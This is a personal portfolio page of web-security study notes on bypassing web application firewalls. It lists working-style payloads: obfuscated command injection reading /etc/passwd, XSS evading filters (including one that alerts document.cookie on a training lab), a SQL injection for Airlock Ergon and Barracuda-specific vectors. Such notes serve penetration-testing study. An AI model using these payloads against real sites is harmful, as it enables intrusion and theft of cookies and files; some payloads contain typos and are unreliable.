<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">



    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <div class="search-bar">
                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
                <!-- <button onclick="search()" class="search-button">Search</button> -->
                <div id="searchResults" class="search-results"></div>

              </div>

            </div>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div> -->
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="1e04bb0b-0357-47f2-a816-aee1c6fdeac5" class="page sans"><header><h1 class="page-title">WAF Bypass</h1><p class="page-description"></p></header><div class="page-body"><p id="c5b9b59e-ba5d-48f8-a445-2f5b76df5fb5" class="">
</p><ul id="a9b49dea-b99d-4f8b-84b4-84f8b273bc33" class="bulleted-list"><li style="list-style-type:disc">Web application firewalls are comprised of an inspector and a checker.</li></ul><ul id="6d2f2988-940e-4a0b-9775-2c05e329c05c" class="bulleted-list"><li style="list-style-type:disc">Inspector inspects and classifies traffic</li></ul><ul id="146a9a48-4de3-4514-9379-84af5c1b90a7" class="bulleted-list"><li style="list-style-type:disc">the checker will enforce rules, whitelists, blacklists</li></ul><h2 id="22f1c36e-4d77-4bbb-8ae2-a78aff3ecceb" class=""><strong>Bypass techniques:</strong></h2><p id="54ac7368-4334-420a-ae16-d7d3983fe163" class="">IP Spoofing:</p><p id="3c9f17e7-1256-429d-9fd4-2047407ff008" class="">BurpSuite → User Options → Socks _Proxy → use Socks proxy + add info</p><p id="424e1c48-c400-4d16-94b1-e11956f4e081" class=""><code>X-Forwarded-For: 0.0.0.0</code></p><p id="829b7cd2-ce77-4360-8864-cf9e4cdf8773" class="">
</p><p id="7efcb9cc-d819-429e-90e7-78b9a9f16568" class=""><strong>Generic checklist:</strong></p><p id="8bfa4361-c9e4-4bc5-9512-8fcdd70e0b57" class=""><strong>Base64 encoding our payload</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="80e4e056-27a8-4e61-bfbe-fb4e95acb107" class="code"><code class="language-Python">/?q=&lt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=_</code></pre><p id="624c0b8a-940c-436d-843e-f1ac14f1e8b9" class="">ASPX removes % not followed by two hex characters</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fe9442ac-16be-47bf-8d79-9fbc9daee0db" class="code"><code class="language-Python">https://site.com/index.php?%file=cat /etc/paswd</code></pre><p id="cf482b3c-6756-4f2f-9171-8ebfce51b521" class="">We can use spaces to fool a WAF </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3cb9d8fe-f813-455d-886e-c13b971e1b00" class="code"><code class="language-Python">&lt;Img src = x onerror = &quot;javascript:window.onerror = alert; throw XSS&quot;&gt;</code></pre><p id="52a8a608-133b-4f64-af62-5e08fb1164d3" class=""><strong>Backslashes in filtered words</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81bb564d-da78-4ade-b839-39c2ff3f48cb" class="code"><code class="language-Python">https://site.com/index.php?file=cat/etc/pa\swd</code></pre><p id="0a9d916c-93d9-412c-9e89-8d062bb8b9d7" class="">
</p><p id="e8ba8fb8-a4aa-4db3-9123-8d2942bf2345" class=""><strong>Quotes and * </strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ba1f0a16-c86d-42a9-8df3-7c5302079391" class="code"><code class="language-Python">https://site.com/index.php?file=cat /etc/pa*swd

https://site.com/index.php?file=cat /etc/pa**swd

https://site.com/index.php?file=cat /etc/pa&#x27;s&#x27;wd

https://site.com/index.php?file=cat /etc/pa&quot;s&quot;wd</code></pre><p id="18ef01ae-ffd9-4af9-9315-02fadb63f932" class="">
</p><p id="5dc08460-6679-470a-97aa-2a73c5d87474" class="">Wildcards </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="df88a9de-027e-4300-87b0-c5afc8981f96" class="code"><code class="language-Python">https://site.com/index.php?file=cat /e??/p????</code></pre><p id="ea6153ee-f536-4fe8-a9fe-d869e5e6deff" class="">Replace spaces with / </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="62b8d0c4-d01e-4755-93e3-8412772df72b" class="code"><code class="language-Python">&lt;svg/onload&gt;</code></pre><p id="84e0f83b-6272-4481-9a31-edd50ceb4fab" class="">Custom tags </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2805e09a-e949-4509-a117-fb06b7d41255" class="code"><code class="language-Python">https://acd91f8b1e2bae3781d35fe600c30081.web-security-academy.net/?search=&lt;CUSTOM+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1&gt;#x</code></pre><p id="ecb03216-fe27-4ea7-a6d8-b04f7f9aa4c4" class="">
</p><p id="737df5e3-70a6-44fc-827b-b39bae0ddff9" class="">Using different language chars</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="da22af66-6199-4bd7-9b2a-b368e29b4b73" class="code"><code class="language-Python">e.g. ē instead of e</code></pre><p id="868ed121-7cfe-44ef-a539-844b2a9ec187" class="">
</p><p id="a3f9c576-18d7-48aa-93d8-2f7290f8f1de" class="">Airlock Ergon</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6ed56a43-4f0a-4f4a-8c0b-74ff5ed950c5" class="code"><code class="language-Python">%C0%80&#x27;+union+select+col1,col2,col3+from+table+--+</code></pre><p id="3bc081a5-ffbe-4f7d-ac8b-181211679008" class="">
</p><p id="e7589059-57a8-4147-a70e-5cd24271069c" class="">Every space here is replaced by a + and we have the %C0 and %80 url encoded</p><p id="9a79acbc-b7ed-4a7b-bcd4-b3fe5e7d07bb" class="">values at the beginning of our attack vector</p><p id="bd8f333f-26a2-409c-8390-a9df51002fba" class="">
</p><p id="631c4d55-fcc5-4448-8c24-cbbce7d2a0ee" class="">Barracuda</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bae3eb93-31bf-4ae1-b08c-9be64e418b2d" class="code"><code class="language-Python">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;alert(1)&quot;&gt;

&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;

&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;</code></pre><p id="6b44cffd-db4c-4b9c-a878-de8f98459816" class="">A smart bypass making use of several tricks. The first line will use the onwheel</p><p id="b281c216-8482-4ceb-b1a5-08e4b5ffaf0e" class="">event handler which is not filtered in Barracuda. We also have a very smart use of</p><p id="8f20fb4d-353e-4fa8-b501-51aa9e2c2a67" class="">the url encoded characters on the third line.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e01bfe57-bc52-48da-a7e5-82f3858f0d96" class="code"><code class="language-Python">GET /cgi-mod/index.cgi?&amp;primary_tab=ADVANCED&amp;secondary_tab=test_backup_server&amp;content_only

=1&amp;&amp;&amp;backup_port=21&amp;&amp;backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/

bad-example.exe%3E&amp;&amp;backup_type=ftp&amp;&amp;backup_life=5&amp;&amp;backup_server=%3E%22%3Ciframe%20src%3D

http%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_path=%3E%22%3Ciframe%20src%3Dhttp%

3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_password=%3E%22%3Ciframe%20src%3Dhttp%3

A//www.example.net%20width%3D800%20height%3D800%3E&amp;&amp;user=guest&amp;&amp;password=121c34d4e85dfe675

8f31ce2d7b763e7&amp;&amp;et=1261217792&amp;&amp;locale=en_US

Host: favoritewaf.com

User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)</code></pre><p id="c2896998-a9ca-421a-8a76-7577773c0444" class="">Several smart tricks to achieve HTMLi:</p><p id="7de4cddc-c1ee-4272-a6e2-1058e1bd305a" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3f07ad0b-a3f5-4a43-a750-14b9a8c17ab9" class="code"><code class="language-Python">&lt;a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()&gt;clickhere</code></pre><p id="407e455b-e04a-4148-b9e9-03524c0c111b" class="">url encoded value %0A which is placed between every character of javascript. %0A translates to a linefeed.</p><p id="8f2fbb29-ec2c-4243-bedd-f7da0bfc749f" class="">
</p><ul id="7f992631-0010-4301-bd33-f806c05af2b4" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/0xInfection/Awesome-WAF#known-bypasses">https://github.com/0xInfection/Awesome-WAF#known-bypasses</a></li></ul></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
    <script src="../../../../../../assets/js/search.js"></script>


</body>
</html>